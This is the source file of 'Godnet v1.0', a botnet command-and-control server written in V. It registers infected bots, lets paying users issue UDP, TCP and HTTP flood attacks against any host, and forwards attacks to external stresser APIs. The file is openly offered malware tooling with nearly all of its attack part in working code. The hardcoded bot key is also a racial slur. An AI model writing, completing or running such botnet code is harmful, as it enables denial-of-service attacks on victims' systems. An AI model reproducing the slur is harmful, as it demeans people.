/*
*   ╔═╗╔═╗╔╦╗╔╗╔╔═╗╔╦╗
*   ║ ╦║ ║ ║║║║║║╣  ║
*   ╚═╝╚═╝═╩╝╝╚╝╚═╝ ╩ 
*
* @title: Godnet v1.0
* @author: Jeff The eGod
* @since: 2/20/24
*
*/
import io
import os
import net
import time
import net.http
import x.json2 as json

import src as gn

pub const (
	
	help	= "Name              Description\r
____________________________________________\r
Help		  List of help commands\r
Methods		  List of methods\r
Info		  List of your account info\r
Geo		  Geo Location\r
	- ip\r
Attack		  Attack a host\r
	- ip      HOST/URL to Attack\r
	- port    Port to Attack\r
	- time	  Attack Duration\r
	- method  Attack Method\r
Admin		  List of admin commands\r\n"
	hostname = "[{USERNAME}@Godnet]# ~"

	methods = "\rudp\n\rtcp\n\rstd\n\rhttp\n\r"
)

pub struct Client
{
	pub mut:
		info 		gn.User
		io			io.BufferedReader
		socket		net.TcpConn
		
		// Used for collection
		host		string
		port		string
		time		string
		method		string
}

pub struct Bot 
{
	pub mut:
		nickname	string
		os			string
		cpu			string
		arch		string
		cores 		string
		ram 		string
		uname 		string
		ip			string // 
		port		int
		socket		net.TcpConn
}

pub struct Godnet
{
	pub mut:
		socket		net.TcpListener
		bot_sock	net.TcpListener
		port 		int

		/* Database && Configuration Information */
		bot_key		string = "NIGGERBOB"
		bots		[]Bot
		apis		[]gn.API
		users 		[]gn.User
		clients		[]Client
}

fn main()
{
	args := os.args.clone()

	if args.len == 1 {
		println("[ X ] Error, Invalid arguments provided...!\r\nUsage: ${args[0]} <cnc_port>")
		return
	}

	mut g := start_godnet(args[1].int())
	spawn bot_listener(mut &g)
	listener(mut &g)

	time.sleep(time.infinite)
}

fn (mut g Godnet) title_handler(mut c net.TcpConn, client Client)
{
	for {
		gn.set_title(mut c, "Godnet :: Devices [${g.bots.len}] :: Logged in as: ${client.info.name}")
		time.sleep(1*time.second)
	}
}

fn start_godnet(port int) Godnet
{
	mut g := Godnet{}
	mut db := os.read_lines("assets/users.gn") or { [] }

	if db == [] { return g }

	println("${gn.success_sym} Loading Godnet's User Database....")
	for user in db 
	{
		user_info 	:= user.replace("(", "").replace(")", "").replace("'", "").split(",")
		if user_info.len == 9 { g.users << gn.user(user_info) }
	}

	println("${gn.success_sym} Godnet user database loaded....\n${gn.success_sym} Loading APIs!")

	mut apis 		:= g.strip_json_comments(os.read_file("assets/apis.json") or { "" })
	mut json_apis 	:= (json.raw_decode("${apis}") or { json.Any{} }).as_map()

	for key, val in json_apis {
		api_info := (json.raw_decode("${val}") or { json.Any{} }).as_map()
		g.apis << gn.API{
			name: 		key,
			toggle: 	(api_info['TOGGLE'] 		or { "" }).bool(),
			url: 		(api_info['URL'] 			or { "" }).str(),
			cons: 		(api_info['CONS'] 			or { "" }).int(),
			max_attack: (api_info['MAX_ATTACK'] 	or { "" }).int(),
			max_time: 	(api_info['MAX_TIME'] 		or { "" }).int()
		}
	}

	println("${gn.success_sym} APIs completed loaded up.....\r\n${gn.success_sym} Starting Godnet server.....!")

	g.socket = net.listen_tcp(.ip6, ":666") or {
		println("${gn.failed_sym} Error, Unable to start Godnet CNC....")
		return g
	}

	println("${gn.success_sym} Godnet server successfully started.....!")

	g.bot_sock = net.listen_tcp(.ip6, ":420") or { 
		println("${gn.failed_sym} Error, Unable to start Godnet's bot server....")
		return g
	}

	println("${gn.success_sym} Godnet bot server successfully started.....!")

	return g
}

fn listener(mut g Godnet)
{
	println("${gn.success_sym} Listening for users.....!")
	for 
	{
		mut client := g.socket.accept() or {
			println("[ X ] Error, Unable to accept coonection....!")
			&net.TcpConn{}
		}
		client.set_read_timeout(time.infinite)
		spawn g.authorize_user(mut client)
	}
}

fn bot_listener(mut g Godnet)
{
	println("${gn.success_sym} Listening for bots.....!")
	for {
		mut bot_c := g.bot_sock.accept() or {
			println("[ X ] Error, Unable to accept bot connection")
			&net.TcpConn{}
		}
		bot_c.set_read_timeout(time.infinite)
		spawn g.bot_handler(mut bot_c)
	}
}

fn (mut g Godnet) bot_handler(mut bot_c net.TcpConn)
{
	mut bot_reader 	:= io.new_buffered_reader(reader: bot_c)
	bot_ip 			:= bot_c.peer_ip() or { "" }

	secret_key		:= bot_reader.read_line() or { "" }
	if secret_key != g.bot_key {
		bot_c.write_string("[ X ] Error, Invalid secret. Bot was rejected") or { 0 }
	}

	device_info 	:= bot_reader.read_line() or { "" }
	if !device_info.starts_with("{") || !device_info.ends_with("}") {
		bot_c.write_string("[ X ] Error, Invalid access....!") or { 0 }
		return
	}

	mut new_bot := Bot{ nickname: gn.randomized_text(15),
				   ip: bot_ip,
				   port: 0, 
				   socket: bot_c }

	g.parse_bot_specs(mut new_bot, "${device_info}")
	g.bots << new_bot

	println("Bot has connected to Godnet!")
}

fn (mut g Godnet) authorize_user(mut client net.TcpConn)
{
	mut reader := io.new_buffered_reader(reader: client)
	mut user_ip := client.peer_ip() or { g.disconnect_socket(mut client) return }
	gn.set_title(mut client, "Login | Username")
	gn.loading_bar(mut client)

	for i in ['Initializing Godnet.....\r\n', 'Logging in.....\r\n'] {
		gn.animate_text(mut client, "${gn.c_red}${i}${gn.c_default}", 150)
	}

	gn.animate_text(mut client, "└►Username:", 60, gn.bg_red, gn.c_white, " ")
	username := reader.read_line() or { g.disconnect_socket(mut client) return }

	gn.set_title(mut client, "Login | Password")
	gn.animate_text(mut client, "└►Password:", 60, gn.bg_red, gn.c_white, " ${gn.c_black}")
	password := reader.read_line() or { g.disconnect_socket(mut client) return }

	acc := g.find_account(username)
	login_chk := g.validate_login(username, password)
	if !login_chk {
		gn.animate_text(mut client, "${gn.bg_red}${gn.c_white}[ X ] Error, Invalid info provided....!", 60)
		time.sleep(3*time.second)
		g.disconnect_socket(mut client)
		return 
	}

	mut new_user := Client{ info: acc, io: reader, socket: client }
	g.clients << new_user
	spawn g.title_handler(mut client, new_user)
	g.input_handler(mut new_user)
}


/*
*	Input handler, any commands that dont need to
*	be handled will be completed in here
*/
pub fn (mut g Godnet) input_handler(mut c Client)
{
	c.socket.write_string("${gn.clear}") or { 0 }
	banner_file := (os.read_file("assets/banner.gn") or { "" }).replace("{USER}", "${gn.c_white}${c.info.name}${gn.c_red}").replace("{PLAN}", "${gn.c_white}${c.info.plan}${gn.c_red}")
	gn.animate_listed_text(mut c.socket, "${gn.c_red}${banner_file}${gn.c_default}", 150)
	for 
	{
		gn.animate_text(mut c.socket, "${g.create_hostname(c.info.name)}", 60, gn.c_white, gn.bg_red, " ")
		data := c.io.read_line() or { g.disconnect_socket(mut c.socket) return }
		r := gn.new_cmd(data)

		match r.cmd {
			"help", "?" {
				c.socket.write_string("${help}") or { 0 }
			} 
			"methods" {
				c.socket.write_string("${methods}") or { 0 }
			}
			"online" {
				for i, user in g.clients { c.socket.write_string("${i} | ${user.info.name}\r\n") or { 0 } }
			}
			"bots" {
				for idx, bot in g.bots { c.socket.write_string("${gn.c_red}${idx}${gn.c_default} | ${bot.nickname} | ${bot.os}\r\n\t=> CPU: ${bot.cpu}\r\n\t=> Cores: ${bot.cores} | Ram: ${bot.ram}\r\n") or { 0 } }
			} else {}
		}

		// execute action when received more than one argument ofc
		// invalid arguments or data are checked above!
		if r.args.len > 0 {
			g.execute_action(mut c, r)
		}
	}
}

/*
*	Handling commands that need extra work done which includes 
*	argument checking and input sanitizing to protect known
*	vulnerabilities such as RCE etc
*/
pub fn (mut g Godnet) execute_action(mut c Client, r gn.Command)
{
	match r.cmd 
	{
		"geo" {
			if r.args.len != 2 {
				c.socket.write_string("[ X ] Error, Invalid arguments provided\r\nUsage geo <ip>") or { 0 }
				return
			}
			c.socket.write_string("Geo Location For ${r.args[1]}\r\n${g.geo_ip(r.args[1])}") or { 0 }
			return 
		}
		"attack" {
			c.info.authorize_attack([r.args[1], r.args[2], r.args[3], r.args[4]])
			g.broadcast_attack(r.data)
		} else {}
	}
}

pub fn (mut g Godnet) disconnect_socket(mut socket net.TcpConn) bool
{
	mut c := 0
	for mut bot in g.bots 
	{
		if bot.socket == socket {
			g.bots.delete(c)
			println("[ + ] Bot has been disconnected")
			return true
		}
		c++
	}

	c = 0
	for mut client in g.clients 
	{
		if client.socket == socket {
			g.clients.delete(c)
			println("[ + ] User has been disconnected")
			return true
		}
		c++
	}

	return false
}

pub fn (mut g Godnet) ping_all_bots()
{
	
}

pub fn (mut g Godnet) parse_bot_specs(mut b Bot, data string)
{
	/*
		{'os': 'Ubuntu"', 
		'cpu': 'Intel(R) Xeon(R) Gold 6152 CPU @ 2.10GHz', 
		'arch': 'x86_64', 'cores': '4', 
		'uname': 'Linux dreadfull 5.15.0-84-generic #93-Ubuntu SMP Tue Sep 5 17:16:10 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux
	*/
	json_data := data.replace("{", "").replace("}", "").replace("'", "").split(",")
	
	b.os 		= json_data[0].replace("os:", "").trim_space()
	b.cpu 		= json_data[1].replace("cpu:", "").trim_space()
	b.arch 		= json_data[2].replace("arch:", "").trim_space()
	b.cores 	= json_data[3].replace("cores:", "").trim_space()
	b.ram 		= json_data[4].replace("ram:", "").trim_space()
}

pub fn (mut g Godnet) broadcast_attack(data string)
{
	mut c := 0
	for mut bot in g.bots {
		bot.socket.write_string("${data}\n") or { 0 }
		c++
	}

	println("[ + ] Command sent to ${c} bots")
}

pub fn (mut g Godnet) create_hostname(username string) string
{
	if username != "" 
	{ return hostname.replace("{USERNAME}", username) }

	return hostname.replace("{USERNAME}", "root")
}

pub fn (mut g Godnet) find_account(username string) gn.User
{
	for mut user in g.users
	{ if "${user.name}" == "${username}" { return user } }

	return gn.User{}
}

pub fn (mut g Godnet) validate_login(username string, password string) bool
{
	mut acc := g.find_account(username)
	if acc.name == "" { return false }
	if acc.name == "${username}" && acc.password == "${password}"
	{ return true }

	return false
}

pub fn (mut g Godnet) strip_json_comments(json_data string) string
{
	mut new := ""
	lines := json_data.split("\n")

	for line in lines {
		if !line.trim_space().starts_with("//")
		{
			new += "${line}\n"
		}
	}
	return new
}

pub fn (mut g Godnet) send_attack(mut c Client) 
{
	mut responses := ""

	for api in g.apis
	{
		// If method used not in API, Skip
		if c.method !in api.methods { continue }

		// if time used over the API's max time, Skip
		if c.time.int() > api.max_time { 
			responses += "[ X ] Error, Unable to send to ${api.name} due to the time being over the API's maximum attack time!\r\n"
			continue 
		}

		format_api := api.url.replace("{HOST}", c.host).replace("{PORT}", c.port).replace("{TIME}", c.time).replace("{METHOD}", c.method)
		resp := http.get_text(format_api)

		if "[ X ]" in resp.to_lower().split(" ") || resp.to_lower().contains("\"status\":\"false\"") || resp.to_lower().contains("\"status\": \"false\"")
		{
			responses += "[ X ] It seems like ${api.name} was unable to send attack\r\n"
			continue
		}

		responses += "[ + ] Attack successfully sent to ${api.name}\r\n"
	}
}

pub fn (mut g Godnet) geo_ip(ip string) string
{
	return http.get_text("http://ip-api.com/json/${ip}").replace("{", "").replace("}", "").replace(": ", ":").replace("\",\"", "\r\n").replace("','", "\r\n").replace(":", ": ").replace("\"", "") + "\r\n"
}